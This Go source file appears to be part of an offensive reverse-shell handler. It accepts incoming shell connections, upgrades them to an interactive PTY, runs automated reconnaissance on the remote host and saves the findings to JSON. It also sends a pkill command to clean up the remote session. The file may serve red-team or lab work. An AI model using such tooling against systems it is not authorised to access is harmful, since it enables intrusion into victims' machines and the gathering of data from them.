package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// killRemoteProcessGroup attempts to kill any processes that may have been
// spawned by the remote shell to establish persistence. We use pgrep to find
// processes in the same session and send SIGKILL.
//
// This defends against pbsh's "Zombie Persistence" attack where pbsh does:
//   (pbsh_payload &) > /dev/null 2>&1
//
// Note: This requires that we can execute commands on the remote side.
// If the connection is already closed, we can only kill via socket shutdown.
func killRemoteProcessGroup(conn net.Conn) {
	// Try to send a command that will find and kill processes in our session
	killCmd := `pkill -9 -g $$ 2>/dev/null; pkill -9 -P $$ 2>/dev/null; exit 0`
	conn.Write([]byte(killCmd + "\n"))
	time.Sleep(100 * time.Millisecond)
}

func handleSession(conn net.Conn, verbosity int) {
	defer conn.Close()

	addr := conn.RemoteAddr()
	fmt.Println()
	fmt.Println("                                 ▄███▄                             ")
	fmt.Println("                                 ▀▀▀▀▀")
	fmt.Println("   ▄▄▄  ▄▄     ▄▄▄▄  ▄▄▄  ▄▄▄▄  ▀█▀▀▀█▀ ▄▄  ▄▄")
	fmt.Println("  ██▀██ ██    ██▀▀▀ ██▀██ ██▄█▀ ██ ▄ ██ ███▄██")
	fmt.Println("  ██▀██ ██▄▄▄ ▀████ ██▀██ ██     ▀█▀█▀  ██ ▀██")
	fmt.Println()
	fmt.Printf("[+] New reverse shell connection from %s\n", addr)

	disp := newStatusDisplay()
	defer disp.stop() // always stop spinner on exit (error paths)

	u := NewPTYUpgrader(conn, verbosity, disp) // registers PTY Upgrade + Terminal Setup tasks
	reconIdx := disp.addTask("Reconnaissance")

	if err := u.Upgrade(); err != nil {
		disp.stop()
		fmt.Printf("[!] PTY upgrade failed: %v\n", err)
		return
	}

	findingsDir := "findings"
	if err := os.MkdirAll(findingsDir, 0700); err != nil {
		fmt.Printf("[!] Could not create findings directory: %v\n", err)
	}

	rawPath, sections, err := executeRecon(u, findingsDir, addr.String(), disp, reconIdx)
	if err != nil {
		disp.stop()
		fmt.Printf("[!] Recon failed: %v\n", err)
		return
	}

	// Drain the prompt left in the bufio buffer after the recon sentinel.
	u.readUntilPrompt(1 * time.Second)

	findings := (&ReconParser{}).Parse(sections)
	matches := matchFindings(findings)

	// Stop the spinner and wipe the task list before printing the report.
	disp.stop()
	disp.clear()

	if rawPath != "" {
		fmt.Printf("[*] Raw output saved to: %s\n", rawPath)
	}

	// saveFindings marshals JSON and writes to disk — run it concurrently
	// with printSummary which is pure string formatting + stdout.
	// The returned path is buffered and printed after Interact() so it
	// doesn't interleave with raw-mode terminal output.
	savedPath := make(chan string, 1)
	go func() { savedPath <- saveFindings(findings, addr) }()
	printSummary(findings, matches)

	// Interact() returns when the connection drops or Ctrl+D is pressed.
	// If pbsh (or any shell) is zombie (ignoring SIGTERM/SIGINT), we need
	// to hard-kill the session by:
	// 1. Sending a "kill all in session" command (double-fork won't help)
	// 2. Force-closing the socket (SIGPIPE to the shell)
	u.Interact()

	// Session ended. Attempt to kill any persistent processes via command.
	// This sends pkill -9 -g $$ to kill all processes in the current session.
	killRemoteProcessGroup(conn)

	// Force close the connection to ensure no data can be sent/received
	conn.Close()

	if path := <-savedPath; path != "" {
		fmt.Printf("\n[*] Findings saved to: %s\n", path)
	}
}

func saveFindings(f *Findings, addr net.Addr) string {
	findingsDir := "findings"
	if err := os.MkdirAll(findingsDir, 0700); err != nil {
		fmt.Printf("[!] Could not create findings directory: %v\n", err)
		return ""
	}

	timestamp := time.Now().Format("20060102_150405")
	host := "unknown"
	if addr != nil {
		host = addr.String()
		if strings.Contains(host, ":") {
			parts := strings.Split(host, ":")
			host = strings.Join(parts[:len(parts)-1], ":")
		}
	}
	filename := fmt.Sprintf("findings_%s_%s.json", host, timestamp)
	outpath := filepath.Join(findingsDir, filename)

	data, err := json.MarshalIndent(f, "", "  ")
	if err != nil {
		fmt.Printf("[!] Could not marshal findings: %v\n", err)
		return ""
	}

	if err := os.WriteFile(outpath, data, 0600); err != nil {
		fmt.Printf("[!] Could not save findings: %v\n", err)
		return ""
	}

	return outpath
}
